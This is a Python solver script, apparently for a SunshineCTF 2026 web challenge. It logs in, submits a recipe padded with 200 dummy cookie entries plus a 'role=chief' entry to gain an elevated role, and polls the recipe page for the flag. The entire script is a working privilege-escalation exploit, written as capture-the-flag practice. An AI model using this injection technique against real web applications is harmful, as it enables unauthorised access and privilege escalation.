import requests
import time

base = 'https://tomorrow.web.2026.sunshinectf.games'
username = 'astro_test_123'
password = 'password123'

s = requests.Session()
r_login = s.post(f'{base}/login', json={'username': username, 'password': password})
print("Login:", r_login.status_code, r_login.text)

# Let's craft the ingredients:
# 200 dummy cookies + role=chief
ingredients = []
for i in range(200):
    ingredients.append({'name': f'c{i}', 'value': '1'})
ingredients.append({'name': 'role', 'value': 'chief'})

print(f"Total ingredients: {len(ingredients)}")

r_recipe = s.post(f'{base}/api/recipe', json={
    'title': 'Golden Seal Batch',
    'ingredients': ingredients
})
print("Create recipe:", r_recipe.status_code, r_recipe.text)
recipe_data = r_recipe.json()
recipe_id = recipe_data['id']

r_submit = s.post(f'{base}/api/recipe/{recipe_id}/submit')
print("Submit:", r_submit.status_code, r_submit.text)

# Now let's poll the batch page
print(f"Polling recipe {recipe_id}...")
for attempt in range(12):
    time.sleep(2)
    r_poll = s.get(f'{base}/recipe/{recipe_id}')
    status_lines = [line.strip() for line in r_poll.text.splitlines() if any(k in line.lower() for k in ['seal', 'gold', 'review', 'sun{', 'flag', 'status'])]
    print(f"Attempt {attempt+1}:")
    for l in status_lines:
        print("  ", l)
    if 'sun{' in r_poll.text or 'gold' in r_poll.text.lower() or 'chief' in r_poll.text.lower():
        if 'sun{' in r_poll.text:
            print("\n*** FOUND FLAG! ***\n")
            print(r_poll.text)
            break

